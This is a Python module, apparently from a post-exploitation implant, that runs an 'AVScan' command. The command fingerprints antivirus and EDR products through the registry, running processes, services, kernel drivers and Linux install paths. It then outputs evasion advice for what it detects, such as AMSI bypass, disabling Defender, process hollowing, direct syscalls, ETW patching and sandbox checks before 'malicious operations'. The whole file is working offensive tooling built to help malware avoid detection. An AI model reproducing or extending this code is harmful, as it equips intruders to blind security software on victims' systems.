#!/usr/bin/env python3
"""
Elite AVScan Command Implementation - FULLY NATIVE, NO SUBPROCESS
Advanced AV/EDR detection using only native APIs
"""

import os
import sys
import ctypes
from ctypes import wintypes
import winreg
from typing import Dict, Any, List
import glob

def elite_avscan(detailed: bool = True) -> Dict[str, Any]:
    """
    Elite AV/EDR detection with ZERO subprocess calls
    Identifies security products without triggering them
    """
    
    try:
        result = {
            "success": True,
            "av_products": [],
            "edr_products": [],
            "firewall": {},
            "defender_status": {},
            "security_center": [],
            "processes": [],
            "services": [],
            "drivers": [],
            "recommendations": []
        }
        
        if sys.platform == 'win32':
            _windows_av_scan(result, detailed)
        else:
            _unix_av_scan(result, detailed)
        
        # Add evasion recommendations based on findings
        if result["av_products"] or result["edr_products"]:
            result["recommendations"] = _get_evasion_recommendations(result)
        
        return result
        
    except Exception as e:
        return {
            "success": False,
            "error": f"AV scan failed: {str(e)}"
        }

def _windows_av_scan(result: Dict[str, Any], detailed: bool):
    """Windows AV/EDR detection using native APIs"""
    
    # 1. Check Windows Defender status
    _check_defender_status(result)
    
    # 2. Check installed AV products via registry
    _check_registry_av(result)
    
    # 3. Check running AV processes
    _check_av_processes(result)
    
    # 4. Check AV services
    _check_av_services(result)
    
    # 5. Check security drivers
    if detailed:
        _check_security_drivers(result)
    
    # 6. Check WMI Security Center
    _check_security_center(result)

def _check_defender_status(result: Dict[str, Any]):
    """Check Windows Defender status via registry"""
    
    try:
        defender_info = {}
        
        # Check if Defender is enabled
        key_paths = [
            (r"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring"),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware"),
            (r"SOFTWARE\Microsoft\Windows Defender", "DisableAntiSpyware")
        ]
        
        for key_path, value_name in key_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                value, _ = winreg.QueryValueEx(key, value_name)
                winreg.CloseKey(key)
                
                if value == 1:
                    defender_info["realtime_protection"] = False
                    break
                else:
                    defender_info["realtime_protection"] = True
            except:
                defender_info["realtime_protection"] = True  # Default to enabled if key not found
        
        # Check Defender version
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows Defender"
            )
            version, _ = winreg.QueryValueEx(key, "Version")
            defender_info["version"] = version
            winreg.CloseKey(key)
        except:
            pass
        
        # Check signature update status
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows Defender\Signature Updates"
            )
            av_sig, _ = winreg.QueryValueEx(key, "AVSignatureVersion")
            defender_info["av_signature"] = av_sig
            winreg.CloseKey(key)
        except:
            pass
        
        if defender_info.get("realtime_protection", True):
            result["av_products"].append({
                "name": "Windows Defender",
                "type": "Built-in AV",
                "status": "Active",
                "details": defender_info
            })
        
        result["defender_status"] = defender_info
        
    except Exception:
        pass

def _check_registry_av(result: Dict[str, Any]):
    """Check for installed AV products in registry"""
    
    av_registry_locations = [
        r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    ]
    
    known_av_keywords = [
        "antivirus", "anti-virus", "av", "endpoint", "edr",
        "kaspersky", "bitdefender", "norton", "mcafee", "avast",
        "avg", "eset", "malwarebytes", "sophos", "trend micro",
        "symantec", "crowdstrike", "carbon black", "sentinel",
        "cylance", "fireeye", "palo alto", "fortinet", "f-secure",
        "webroot", "comodo", "avira", "bullguard", "panda"
    ]
    
    found_products = []
    
    for reg_path in av_registry_locations:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
            
            i = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    
                    try:
                        display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                        display_name_lower = display_name.lower()
                        
                        for keyword in known_av_keywords:
                            if keyword in display_name_lower:
                                publisher = ""
                                version = ""
                                install_location = ""
                                
                                try:
                                    publisher, _ = winreg.QueryValueEx(subkey, "Publisher")
                                except:
                                    pass
                                
                                try:
                                    version, _ = winreg.QueryValueEx(subkey, "DisplayVersion")
                                except:
                                    pass
                                
                                try:
                                    install_location, _ = winreg.QueryValueEx(subkey, "InstallLocation")
                                except:
                                    pass
                                
                                product_info = {
                                    "name": display_name,
                                    "publisher": publisher,
                                    "version": version,
                                    "install_location": install_location,
                                    "type": "Registry Detection"
                                }
                                
                                if product_info not in found_products:
                                    found_products.append(product_info)
                                    
                                    # Categorize as AV or EDR
                                    if any(edr in display_name_lower for edr in 
                                          ["edr", "endpoint", "crowdstrike", "carbon", "sentinel", "cylance"]):
                                        result["edr_products"].append(product_info)
                                    else:
                                        result["av_products"].append(product_info)
                                break
                    except:
                        pass
                    
                    winreg.CloseKey(subkey)
                    i += 1
                    
                except WindowsError:
                    break
            
            winreg.CloseKey(key)
            
        except:
            pass

def _check_av_processes(result: Dict[str, Any]):
    """Check for running AV/EDR processes"""
    
    # Import our API wrapper
    sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
    from api_wrappers import get_native_api
    
    api = get_native_api()
    processes = api.list_processes()
    
    av_process_signatures = {
        # Traditional AV
        "avgui.exe": "AVG Antivirus",
        "avguard.exe": "Avira",
        "avscan.exe": "McAfee",
        "bdagent.exe": "Bitdefender",
        "ccapp.exe": "Symantec",
        "ekrn.exe": "ESET",
        "fsav32.exe": "F-Secure",
        "kavtray.exe": "Kaspersky",
        "mbam.exe": "Malwarebytes",
        "msmpeng.exe": "Windows Defender",
        "msseces.exe": "Microsoft Security Essentials",
        "navapsvc.exe": "Norton",
        "nod32.exe": "ESET NOD32",
        "sophosui.exe": "Sophos",
        
        # EDR/Advanced
        "cb.exe": "Carbon Black",
        "crowdstrike.exe": "CrowdStrike",
        "cylancesvc.exe": "Cylance",
        "fortiedr.exe": "FortiEDR",
        "sentinelagent.exe": "SentinelOne",
        "taniumclient.exe": "Tanium",
        "xagt.exe": "FireEye",
        
        # Additional Security
        "bdservicehost.exe": "Bitdefender",
        "epag.exe": "Symantec Endpoint",
        "fsaua.exe": "F-Secure",
        "klnagent.exe": "Kaspersky",
        "mcshield.exe": "McAfee",
        "savservice.exe": "Sophos",
        "tmccsf.exe": "Trend Micro",
        "wrsa.exe": "Webroot"
    }
    
    for process in processes:
        process_name = process.get('name', '').lower()
        
        for av_proc, product_name in av_process_signatures.items():
            if av_proc.lower() in process_name:
                result["processes"].append({
                    "name": process_name,
                    "product": product_name,
                    "pid": process.get('pid'),
                    "type": "Process Detection"
                })
                
                # Add to appropriate category
                if any(edr in product_name.lower() for edr in 
                      ["edr", "carbon", "crowdstrike", "sentinel", "cylance", "tanium"]):
                    if product_name not in [p.get('name') for p in result["edr_products"]]:
                        result["edr_products"].append({
                            "name": product_name,
                            "type": "Running Process"
                        })
                else:
                    if product_name not in [p.get('name') for p in result["av_products"]]:
                        result["av_products"].append({
                            "name": product_name,
                            "type": "Running Process"
                        })

def _check_av_services(result: Dict[str, Any]):
    """Check for AV/EDR services"""
    
    av_services = {
        "WinDefend": "Windows Defender",
        "Sense": "Windows Defender ATP",
        "AVP": "Kaspersky",
        "avast": "Avast",
        "avg": "AVG",
        "MBAMService": "Malwarebytes",
        "McAfeeFramework": "McAfee",
        "VSSERV": "Bitdefender",
        "SAVService": "Sophos",
        "SepMasterService": "Symantec",
        "ekrn": "ESET",
        "fsaua": "F-Secure",
        "CylanceSvc": "Cylance",
        "CSFalconService": "CrowdStrike",
        "cb": "Carbon Black",
        "SentinelAgent": "SentinelOne"
    }
    
    try:
        advapi32 = ctypes.windll.advapi32
        
        # Open service control manager
        scm = advapi32.OpenSCManagerW(None, None, 0x0004)  # SC_MANAGER_ENUMERATE_SERVICE
        
        if scm:
            for service_name, product_name in av_services.items():
                # Try to open each service
                service = advapi32.OpenServiceW(scm, service_name, 0x0001)  # SERVICE_QUERY_STATUS
                
                if service:
                    result["services"].append({
                        "name": service_name,
                        "product": product_name,
                        "status": "Active"
                    })
                    
                    advapi32.CloseServiceHandle(service)
                    
                    # Add to appropriate category
                    if "edr" in product_name.lower() or product_name in [
                        "CrowdStrike", "Carbon Black", "SentinelOne", "Cylance"
                    ]:
                        if product_name not in [p.get('name') for p in result["edr_products"]]:
                            result["edr_products"].append({
                                "name": product_name,
                                "type": "Windows Service"
                            })
                    else:
                        if product_name not in [p.get('name') for p in result["av_products"]]:
                            result["av_products"].append({
                                "name": product_name,
                                "type": "Windows Service"
                            })
            
            advapi32.CloseServiceHandle(scm)
            
    except:
        pass

def _check_security_drivers(result: Dict[str, Any]):
    """Check for security-related drivers"""
    
    driver_signatures = [
        "klif.sys",  # Kaspersky
        "avgntflt.sys",  # Avira
        "aswSP.sys",  # Avast
        "SRTSP.sys",  # Symantec
        "bdfsfltr.sys",  # Bitdefender
        "eamonm.sys",  # ESET
        "fsflt.sys",  # F-Secure
        "mbam.sys",  # Malwarebytes
        "savonaccess.sys",  # Sophos
        "tmcomm.sys",  # Trend Micro
        "cbk7.sys",  # Carbon Black
        "csagent.sys",  # CrowdStrike
        "cyoptics.sys",  # Cylance
        "sentinel.sys"  # SentinelOne
    ]
    
    drivers_path = r"C:\Windows\System32\drivers"
    
    if os.path.exists(drivers_path):
        for driver in driver_signatures:
            driver_path = os.path.join(drivers_path, driver)
            if os.path.exists(driver_path):
                result["drivers"].append({
                    "name": driver,
                    "path": driver_path,
                    "type": "Kernel Driver"
                })

def _check_security_center(result: Dict[str, Any]):
    """Check Windows Security Center via WMI"""
    
    try:
        # This would use WMI, but since we're avoiding subprocess,
        # we'll check via registry instead
        key_path = r"SOFTWARE\Microsoft\Security Center\Provider"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            i = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    result["security_center"].append({
                        "provider": subkey_name,
                        "source": "Security Center Registry"
                    })
                    i += 1
                except WindowsError:
                    break
            
            winreg.CloseKey(key)
        except:
            pass
            
    except:
        pass

def _unix_av_scan(result: Dict[str, Any], detailed: bool):
    """Unix/Linux AV detection"""
    
    # Check for common AV products on Linux
    av_paths = {
        "/opt/sophos-av": "Sophos",
        "/opt/eset": "ESET",
        "/opt/kaspersky": "Kaspersky",
        "/usr/bin/clamscan": "ClamAV",
        "/opt/avg": "AVG",
        "/opt/f-secure": "F-Secure",
        "/opt/mcafee": "McAfee",
        "/opt/symantec": "Symantec"
    }
    
    for path, product in av_paths.items():
        if os.path.exists(path):
            result["av_products"].append({
                "name": product,
                "path": path,
                "type": "Installation Directory"
            })
    
    # Check for SELinux/AppArmor
    if os.path.exists("/etc/selinux/config"):
        result["security_center"].append({
            "name": "SELinux",
            "type": "Mandatory Access Control"
        })
    
    if os.path.exists("/etc/apparmor.d"):
        result["security_center"].append({
            "name": "AppArmor",
            "type": "Mandatory Access Control"
        })

def _get_evasion_recommendations(result: Dict[str, Any]) -> List[str]:
    """Generate evasion recommendations based on detected products"""
    
    recommendations = []
    
    # Check for specific products and add targeted recommendations
    detected_products = [p.get('name', '').lower() for p in result["av_products"] + result["edr_products"]]
    
    if any("defender" in p for p in detected_products):
        recommendations.append("Use AMSI bypass before executing PowerShell")
        recommendations.append("Disable Windows Defender via registry if elevated")
    
    if any("crowdstrike" in p for p in detected_products):
        recommendations.append("Avoid process injection - CrowdStrike monitors closely")
        recommendations.append("Use process hollowing instead of direct injection")
    
    if any("carbon black" in p for p in detected_products):
        recommendations.append("Avoid suspicious process chains")
        recommendations.append("Use legitimate process for persistence")
    
    if result["edr_products"]:
        recommendations.append("Use direct syscalls to bypass userland hooks")
        recommendations.append("Implement ETW patching before operations")
        recommendations.append("Use process ghosting techniques")
    
    # General recommendations
    recommendations.extend([
        "Implement sleep/delay before malicious operations",
        "Check for sandbox/VM environment before executing",
        "Use encrypted payloads with environmental keying",
        "Implement anti-debugging techniques",
        "Use legitimate Windows utilities (LOLBins) when possible"
    ])
    
    return recommendations